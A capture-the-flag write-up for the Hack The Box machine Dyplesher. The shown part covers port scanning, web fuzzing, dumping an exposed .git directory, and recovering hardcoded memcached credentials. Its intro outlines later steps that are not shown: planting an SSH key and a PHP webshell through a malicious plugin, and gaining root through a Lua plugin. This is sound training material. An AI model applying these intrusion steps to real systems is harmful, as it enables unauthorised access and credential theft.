I"’™<blockquote>
  <p>Dyplesher was one of the toughest machine Iâ€™ve ever encountered with lots of new things to learn. Initial enumeration leads us to a virtual host with a .git directory exposing credentials for memcached. After understanding memcached is using binary protocol for authentication, rather than guessing key names to dump data I wrote my own memcache key brute forcing script, using this script we are able to dump username and password from the cache. One of these credentials allows us to access Gogs, Inside Gogs we discover a GitLab backup containing four git bundles, one of these bundles contains Minecraft plugin data along with a SQLite database file containing a password hash, Cracked password authorizes login to Dyplesher Dashboard. Using this dashboard we can upload and run Minecraft plugins, Weâ€™ll then write a malicious plugin that Injects a SSH key and also writes a PHP backdoor webshell on the server, Leveraging SSH key weâ€™ll access the box where we discover the user is part of Wireshark group having access to dumpcap binary, utilizing it weâ€™ll capture raw traffic over loopback interface discovering AMQP packets containing username and passwords of multiple users. One of these users has a note to send plugin download URL over RabbitMQ queue which gets the server to download and execute a Cuberite Plugin. Weâ€™ll create a malicious Lua Script (Cuberite Plugin) which on execution drops a SSH key to root allowing us to elevate privileges to root.</p>
</blockquote>

<h2 id="reconnaissance">Reconnaissance</h2>

<p>Letâ€™s begin with <code class="language-plaintext highlighter-rouge">masscan</code> to identify open TCP and UDP ports</p>

<h4 id="masscan">masscan</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ masscan <span class="nt">-e</span> tun0 <span class="nt">-p1-65535</span>,U:1-65535 <span class="nt">--rate</span> 500 10.10.10.190 | <span class="nb">tee </span>masscan.ports

Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-10-26 14:42:49 GMT
 <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
Initiating SYN Stealth Scan
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 4369/tcp on 10.10.10.190
Discovered open port 80/tcp on 10.10.10.190
Discovered open port 5672/tcp on 10.10.10.190
Discovered open port 25565/tcp on 10.10.10.190
Discovered open port 22/tcp on 10.10.10.190
Discovered open port 25562/tcp on 10.10.10.190
Discovered open port 3000/tcp on 10.10.10.190
Discovered open port 11211/tcp on 10.10.10.190
Discovered open port 25672/tcp on 10.10.10.190
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Looking at the output, we have multiple tcp ports. Letâ€™s format the result using <code class="language-plaintext highlighter-rouge">sed</code> and <code class="language-plaintext highlighter-rouge">awk</code> and run nmap scan against them :</p>

<h4 id="nmap">nmap</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ <span class="nb">cat </span>masscan.ports | <span class="nb">grep </span>tcp | <span class="nb">sed</span> <span class="s1">'s/Discovered open port //'</span> | <span class="nb">awk</span> <span class="nt">-F</span>/ <span class="s1">'{print $1}'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">','</span>
4369,80,5672,25565,22,25562,3000,11211,25672,

cfx:  ~/Documents/htb/dyplesher
â†’ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p4369</span>,80,5672,25565,22,25562,3000,11211,25672 10.10.10.190
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-10-26 20:26 IST
Nmap scan report <span class="k">for </span>10.10.10.190
Host is up <span class="o">(</span>0.28s latency<span class="o">)</span><span class="nb">.</span>

PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.0p1 Ubuntu 6build1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   3072 7e:ca:81:78:ec:27:8f:50:60:db:79:cf:97:f7:05:c0 <span class="o">(</span>RSA<span class="o">)</span>
|   256 e0:d7:c7:9f:f2:7f:64:0d:40:29:18:e1:a1:a0:37:5e <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 9f:b2:4c:5c:de:44:09:14:ce:4f:57:62:0b:f9:71:81 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp    open  http       Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Dyplesher
3000/tcp  open  ppp?
| fingerprint-strings:
|   GenericLines, Help:
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
|     Connection: close
|     Request
|   GetRequest:
|     HTTP/1.0 200 OK
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
|     Set-Cookie: <span class="nv">lang</span><span class="o">=</span>en-US<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span>2147483647
|     Set-Cookie: <span class="nv">i_like_gogs</span><span class="o">=</span>77fec466a7c67b0f<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
|     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>YQrOkUVXiimw_Dv_s-wdCSuF39g6MTYwMzcyNDI4Nzk2Njg4NzY4NQ%3D%3D<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">Expires</span><span class="o">=</span>Tue, 27 Oct 2020 14:58:07 GMT<span class="p">;</span> HttpOnly
|     Date: Mon, 26 Oct 2020 14:58:07 GMT
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;<span class="nb">head </span>data-suburl<span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=UTF-8"</span> /&gt;
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=edge"</span>/&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gogs"</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gogs is a painless self-hosted Git service"</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"keywords"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"go, git, self-hosted, gogs"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"referrer"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"no-referrer"</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"_csrf"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"YQrOkUVXiimw_Dv_s-wdCSuF39g6MTYwMzcyNDI4Nzk2Njg4NzY4NQ=="</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"_suburl"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span> /&gt;
|     &lt;meta proper
|   HTTPOptions:
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
|     Set-Cookie: <span class="nv">lang</span><span class="o">=</span>en-US<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> Max-Age<span class="o">=</span>2147483647
|     Set-Cookie: <span class="nv">i_like_gogs</span><span class="o">=</span>63c111443d847cf8<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> HttpOnly
|     Set-Cookie: <span class="nv">_csrf</span><span class="o">=</span>muDQJ-CeJEEDNg2aYflF4EilJd06MTYwMzcyNDI5NDQwMjE5Njc0Mw%3D%3D<span class="p">;</span> <span class="nv">Path</span><span class="o">=</span>/<span class="p">;</span> <span class="nv">Expires</span><span class="o">=</span>Tue, 27 Oct 2020 14:58:14 GMT<span class="p">;</span> HttpOnly
|     Date: Mon, 26 Oct 2020 14:58:14 GMT
|     &lt;<span class="o">!</span>DOCTYPE html&gt;
|     &lt;html&gt;
|     &lt;<span class="nb">head </span>data-suburl<span class="o">=</span><span class="s2">""</span><span class="o">&gt;</span>
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=UTF-8"</span> /&gt;
|     &lt;meta http-equiv<span class="o">=</span><span class="s2">"X-UA-Compatible"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"IE=edge"</span>/&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"author"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gogs"</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"description"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"Gogs is a painless self-hosted Git service"</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"keywords"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"go, git, self-hosted, gogs"</span><span class="o">&gt;</span>
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"referrer"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"no-referrer"</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"_csrf"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"muDQJ-CeJEEDNg2aYflF4EilJd06MTYwMzcyNDI5NDQwMjE5Njc0Mw=="</span> /&gt;
|     &lt;meta <span class="nv">name</span><span class="o">=</span><span class="s2">"_suburl"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">""</span> /&gt;
|_    &lt;meta
4369/tcp  open  epmd       Erlang Port Mapper Daemon
| epmd-info:
|   epmd_port: 4369
|   nodes:
|_    rabbit: 25672
5672/tcp  open  amqp       RabbitMQ 3.7.8 <span class="o">(</span>0-9<span class="o">)</span>
| amqp-info:
|   capabilities:
|     publisher_confirms: YES
|     exchange_exchange_bindings: YES
|     basic.nack: YES
|     consumer_cancel_notify: YES
|     connection.blocked: YES
|     consumer_priorities: YES
|     authentication_failure_close: YES
|     per_consumer_qos: YES
|     direct_reply_to: YES
|   cluster_name: rabbit@dyplesher
|   copyright: Copyright <span class="o">(</span>C<span class="o">)</span> 2007-2018 Pivotal Software, Inc.
|   information: Licensed under the MPL.  See http://www.rabbitmq.com/
|   platform: Erlang/OTP 22.0.7
|   product: RabbitMQ
|   version: 3.7.8
|   mechanisms: PLAIN AMQPLAIN
|_  locales: en_US
11211/tcp open  memcache?
25562/tcp open  unknown
25565/tcp open  minecraft?
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, LDAPSearchReq, LPDString, SIPOptions, SSLSessionReq, TLSSessionReq, afp, ms-sql-s, oracle-tns:
|     <span class="s1">'{"text":"Unsupported protocol version"}
|   NotesRPC:
|     q{"text":"Unsupported protocol version 0, please use one of these versions:
|_    1.8.x, 1.9.x, 1.10.x, 1.11.x, 1.12.x"}
25672/tcp open  unknown
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port3000-TCP:V=7.91%I=7%D=10/26%Time=5F96E3AF%P=x86_64-pc-linux-gnu%r(G
SF:enericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20
SF:text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\
SF:x20Request")%r(GetRequest,2063,"HTTP/1\.0\x20200\x20OK\r\nContent-Type:
SF:\x20text/html;\x20charset=UTF-8\r\nSet-Cookie:\x20lang=en-US;\x20Path=/
SF:;\x20Max-Age=2147483647\r\nSet-Cookie:\x20i_like_gogs=77fec466a7c67b0f;
SF:\x20Path=/;\x20HttpOnly\r\nSet-Cookie:\x20_csrf=YQrOkUVXiimw_Dv_s-wdCSu
SF:F39g6MTYwMzcyNDI4Nzk2Njg4NzY4NQ%3D%3D;\x20Path=/;\x20Expires=Tue,\x2027
SF:\x20Oct\x202020\x2014:58:07\x20GMT;\x20HttpOnly\r\nDate:\x20Mon,\x2026\
[..SNIP..]
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port25565-TCP:V=7.91%I=7%D=10/26%Time=5F96E3D4%P=x86_64-pc-linux-gnu%r(
SF:DNSVersionBindReqTCP,2A,"\)\0'</span><span class="o">{</span><span class="se">\"</span>text<span class="se">\"</span>:<span class="se">\"</span>Unsupported<span class="se">\x</span>20protocol<span class="se">\x</span>20ve
SF:rsion<span class="se">\"</span><span class="o">}</span><span class="s2">")%r(DNSStatusRequestTCP,2A,"</span><span class="se">\)\0</span><span class="s1">'{\"text\":\"Unsupported\x20pr
SF:otocol\x20version\"}")%r(SSLSessionReq,2A,"\)\0'</span><span class="o">{</span><span class="se">\"</span>text<span class="se">\"</span>:<span class="se">\"</span>Unsupported
SF:<span class="se">\x</span>20protocol<span class="se">\x</span>20version<span class="se">\"</span><span class="o">}</span><span class="s2">")%r(TLSSessionReq,2A,"</span><span class="se">\)\0</span><span class="s1">'{\"text\":\"Unsup
SF:ported\x20protocol\x20version\"}")%r(LPDString,2A,"\)\0'</span><span class="o">{</span><span class="se">\"</span>text<span class="se">\"</span>:<span class="se">\"</span>Uns
<span class="o">[</span>..SNIP..]
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>192.77 seconds
</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="summary">Summary:</h4>

<ol>
  <li>Port 22 - SSH</li>
  <li>Port 80, 3000 - HTTP Service, some website on Port 80 &amp; Gogs on Port 3000</li>
  <li>Port 4369 - Erlang Port Mapper Daemon, referencing RabbitMQ node on Port 25672</li>
  <li>Port 5672 - AMQP RabbitMQ</li>
  <li>Port 11211 -  Memcache Service</li>
  <li>Port 25562 - Unknown Service</li>
  <li>Port 25565 - Minecraft</li>
</ol>

<h3 id="port-80---http-service">Port 80 - HTTP Service</h3>

<h4 id="dyplesherhtb---site">Dyplesher.htb - Site</h4>

<p>Visiting <a href="http://10.10.10.190">http://10.10.10.190</a>, front page of the site says <strong>Worst Minecraft Server</strong></p>

<p><img src="/assets/img/Posts/Dyplesher/website.png" alt="website" /></p>

<p>Interestingly, we see reference of VHost <code class="language-plaintext highlighter-rouge">test.dyplesher.htb</code> on the front page, so weâ€™ll that and <code class="language-plaintext highlighter-rouge">dyplesher.htb</code> to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and move forward with our enumeration.</p>

<p>Almost all links seem to be dead except, a youtube link <strong>How to get headshot</strong> (fun video) &amp; <code class="language-plaintext highlighter-rouge">STAFF</code> link which leads us to this page :</p>

<p><img src="/assets/img/Posts/Dyplesher/staff.png" alt="staff" /></p>

<p>These three could be our potential usernames, Beneath each user, there is a Gogs icon which redirects to <code class="language-plaintext highlighter-rouge">http://dyplesher.htb:8080/&lt;username&gt;</code>, thatâ€™s weird because we didnâ€™t see Port 8080 open in <code class="language-plaintext highlighter-rouge">masscan</code> output. Still I tried visiting the link, it kept loading for a while then failed.</p>

<h4 id="web-fuzzing---ffuf">Web Fuzzing - ffuf</h4>

<p>Letâ€™s run <code class="language-plaintext highlighter-rouge">ffuf</code> against the site to discover hidden files and directories, in addition weâ€™ll include <code class="language-plaintext highlighter-rouge">.php</code> extension since the site returns without any error when trying <code class="language-plaintext highlighter-rouge">http://10.10.10.190/index.php</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://10.10.10.190/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt <span class="nt">-fc</span> 403 <span class="nt">-e</span> .php

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.190/FUZZ
 :: Extensions       : .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

favicon.ico             [Status: 200, Size: 0, Words: 1, Lines: 1]
home                    [Status: 200, Size: 4168, Words: 1222, Lines: 84]
index.php               [Status: 200, Size: 4241, Words: 1281, Lines: 124]
login                   [Status: 200, Size: 4168, Words: 1222, Lines: 84]
register                [Status: 200, Size: 4168, Words: 1222, Lines: 84]
robots.txt              [Status: 200, Size: 24, Words: 2, Lines: 3]
staff                   [Status: 200, Size: 4376, Words: 1534, Lines: 103]
:: Progress: [9304/9304]Â :: Job [1/1] :: 76 req/sec :: Duration: [0:02:02] :: Errors: 0 ::
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="login--register">Login &amp; Register</h4>

<p>Visiting <a href="http://10.10.10.190/login">http://10.10.10.190/login</a> brings us to the login page, also visiting <code class="language-plaintext highlighter-rouge">/register</code> redirects us to the login page:</p>

<p><img src="/assets/img/Posts/Dyplesher/login.png" alt="login" /></p>

<h3 id="port-3000---gogs">Port 3000 - Gogs</h3>

<p>On Port 3000 is hosting a Gogs instance. Visiting <code class="language-plaintext highlighter-rouge">http://dyplesher.htb:3000</code> we see Gogs page:</p>

<p><img src="/assets/img/Posts/Dyplesher/gogs.png" alt="gogs" /></p>

<p>Under <code class="language-plaintext highlighter-rouge">Explore</code> page, we can just view the <code class="language-plaintext highlighter-rouge">Users</code> and nothing else, To look at their repositories we need to be authenticated. We can register an account, but it doesnâ€™t give us anything interesting.</p>

<p><img src="/assets/img/Posts/Dyplesher/gogs1.png" alt="gogs1" /></p>

<h3 id="vhost---testdyplesherhtb">VHost - test.dyplesher.htb</h3>

<p><img src="/assets/img/Posts/Dyplesher/vhost.png" alt="vhost" /></p>

<p>Site returns a simple form which takes two inputs and compare them, if both key and value are same, the same page is returned.</p>

<h4 id="web-fuzzing---testdyplesherhtb">Web Fuzzing - test.dyplesher.htb</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://test.dyplesher.htb/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt <span class="nt">-fc</span> 403

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://test.dyplesher.htb/FUZZ
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]
index.php               [Status: 200, Size: 239, Words: 16, Lines: 15]
:: Progress: [4652/4652]Â :: Job [1/1] :: 160 req/sec :: Duration: [0:00:29] :: Errors: 0 ::
</span></pre></td></tr></tbody></table></code></pre></div></div>

<p>Woah ! A <code class="language-plaintext highlighter-rouge">.git</code> directory is getting exposed.</p>

<h4 id="git-dump">Git Dump</h4>

<p>Letâ€™s use <a href="https://github.com/internetwache/GitTools"><strong>GitToolsâ€™s</strong></a> <code class="language-plaintext highlighter-rouge">gitdumper.sh</code> to dump the contents of repository:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/gitrepo
â†’ /opt/GitTools/Dumper/gitdumper.sh http://test.dyplesher.htb/.git/ <span class="nb">.</span>
<span class="c">###########</span>
<span class="c"># GitDumper is part of https://github.com/internetwache/GitTools</span>
<span class="c">#</span>
<span class="c"># Developed and maintained by @gehaxelt from @internetwache</span>
<span class="c">#</span>
<span class="c"># Use at your own risk. Usage might be illegal in certain circumstances.</span>
<span class="c"># Only for educational purposes!</span>
<span class="c">###########</span>


<span class="o">[</span><span class="k">*</span><span class="o">]</span> Destination folder does not exist
<span class="o">[</span>+] Creating ./.git/
<span class="o">[</span>+] Downloaded: HEAD
<span class="o">[</span>-] Downloaded: objects/info/packs
<span class="o">[</span>+] Downloaded: description
<span class="o">[</span>+] Downloaded: config
<span class="o">[</span>+] Downloaded: COMMIT_EDITMSG
<span class="o">[</span>+] Downloaded: index
<span class="o">[</span>-] Downloaded: packed-refs
<span class="o">[</span>+] Downloaded: refs/heads/master
<span class="o">[</span>-] Downloaded: refs/remotes/origin/HEAD
<span class="o">[</span>-] Downloaded: refs/stash
<span class="o">[</span>+] Downloaded: logs/HEAD
<span class="o">[</span>+] Downloaded: logs/refs/heads/master
<span class="o">[</span>-] Downloaded: logs/refs/remotes/origin/HEAD
<span class="o">[</span>-] Downloaded: info/refs
<span class="o">[</span>+] Downloaded: info/exclude
<span class="o">[</span>-] Downloaded: /refs/wip/index/refs/heads/master
<span class="o">[</span>-] Downloaded: /refs/wip/wtree/refs/heads/master
<span class="o">[</span>+] Downloaded: objects/b1/fe9eddcdf073dc45bb406d47cde1704f222388
<span class="o">[</span>-] Downloaded: objects/00/00000000000000000000000000000000000000
<span class="o">[</span>+] Downloaded: objects/3f/91e452f3cbfa322a3fbd516c5643a6ebffc433
<span class="o">[</span>+] Downloaded: objects/e6/9de29bb2d1d6434b8b29ae775ad8c2e48c5391
<span class="o">[</span>+] Downloaded: objects/27/29b565f353181a03b2e2edb030a0e2b33d9af0
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Looking at the <code class="language-plaintext highlighter-rouge">git status</code>, we see two files have been deleted :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/gitrepo  |master U:2 âœ—|
â†’ git status
On branch master
Your branch is based on <span class="s1">'origin/master'</span>, but the upstream is gone.
  <span class="o">(</span>use <span class="s2">"git branch --unset-upstream"</span> to fixup<span class="o">)</span>

Changes not staged <span class="k">for </span>commit:
  <span class="o">(</span>use <span class="s2">"git add/rm &lt;file&gt;..."</span> to update what will be committed<span class="o">)</span>
  <span class="o">(</span>use <span class="s2">"git restore &lt;file&gt;..."</span> to discard changes <span class="k">in </span>working directory<span class="o">)</span>
        deleted:    README.md
        deleted:    index.php

no changes added to commit <span class="o">(</span>use <span class="s2">"git add"</span> and/or <span class="s2">"git commit -a"</span><span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Letâ€™s restore the files using <code class="language-plaintext highlighter-rouge">git restore</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher/gitrepo  |master U:2 âœ—|
â†’ git restore README.md index.php

cfx:  ~/Documents/htb/dyplesher/gitrepo  |master âœ“|
â†’ <span class="nb">ls
</span>index.php  README.md
</pre></td></tr></tbody></table></code></pre></div></div>

<p>While <code class="language-plaintext highlighter-rouge">README.md</code> was empty, we find something interesting inside <code class="language-plaintext highlighter-rouge">index.php</code> :</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;HTML&gt;</span>
<span class="nt">&lt;BODY&gt;</span>
<span class="nt">&lt;h1&gt;</span>Add key and value to memcache<span class="nt">&lt;h1&gt;</span>
<span class="nt">&lt;FORM</span> <span class="na">METHOD=</span><span class="s">"GET"</span> <span class="na">NAME=</span><span class="s">"test"</span> <span class="na">ACTION=</span><span class="s">""</span><span class="nt">&gt;</span>
<span class="nt">&lt;INPUT</span> <span class="na">TYPE=</span><span class="s">"text"</span> <span class="na">NAME=</span><span class="s">"add"</span><span class="nt">&gt;</span>
<span class="nt">&lt;INPUT</span> <span class="na">TYPE=</span><span class="s">"text"</span> <span class="na">NAME=</span><span class="s">"val"</span><span class="nt">&gt;</span>
<span class="nt">&lt;INPUT</span> <span class="na">TYPE=</span><span class="s">"submit"</span> <span class="na">VALUE=</span><span class="s">"Send"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/FORM&gt;</span>

<span class="nt">&lt;pre&gt;</span>
<span class="cp">&lt;?php</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'add'</span><span class="p">]</span> <span class="o">!=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'val'</span><span class="p">]){</span>
        <span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Memcached</span><span class="p">();</span>
        <span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">setOption</span><span class="p">(</span><span class="nc">Memcached</span><span class="o">::</span><span class="no">OPT_BINARY_PROTOCOL</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
        <span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">setSaslAuthData</span><span class="p">(</span><span class="s2">"felamos"</span><span class="p">,</span> <span class="s2">"zxcvbnm"</span><span class="p">);</span>
        <span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">addServer</span><span class="p">(</span><span class="s1">'127.0.0.1'</span><span class="p">,</span> <span class="mi">11211</span><span class="p">);</span>
        <span class="nv">$m</span><span class="o">-&gt;</span><span class="nf">add</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'add'</span><span class="p">],</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'val'</span><span class="p">]);</span>
        <span class="k">echo</span> <span class="s2">"Done!"</span><span class="p">;</span>
<span class="p">}</span>
<span class="k">else</span> <span class="p">{</span>
        <span class="k">echo</span> <span class="s2">"its equal"</span><span class="p">;</span>
<span class="p">}</span>
<span class="cp">?&gt;</span>
<span class="nt">&lt;/pre&gt;</span>

<span class="nt">&lt;/BODY&gt;</span>
<span class="nt">&lt;/HTML&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>We discover credentials for user <code class="language-plaintext highlighter-rouge">felamos:zxcvbnm</code>, traditionally we donâ€™t see memcached requiring credentials for connection. But here itâ€™s using some kind of authentication protocol.</p>

<h2 id="memcached-service">Memcached Service</h2>

<h3 id="overview">Overview</h3>

<p>Memcached supports two protocol, ASCII &amp; Binary. It seems the ASCII protocol is slower than Binary Protocol, also in ASCII protocol based Memcached service we could dump all the keys, But here from the above code, we can see itâ€™s using <code class="language-plaintext highlighter-rouge">Binary Protocol</code></p>

<blockquote>
  <p>Most deployments of Memcached are within trusted networks where clients may freely connect to any server. However, sometimes Memcached is deployed in untrusted networks or where administrators want to exercise control over the clients that are connecting. For this purpose Memcached can be compiled with optional SASL authentication support. The SASL support requires the binary protocol.</p>
</blockquote>

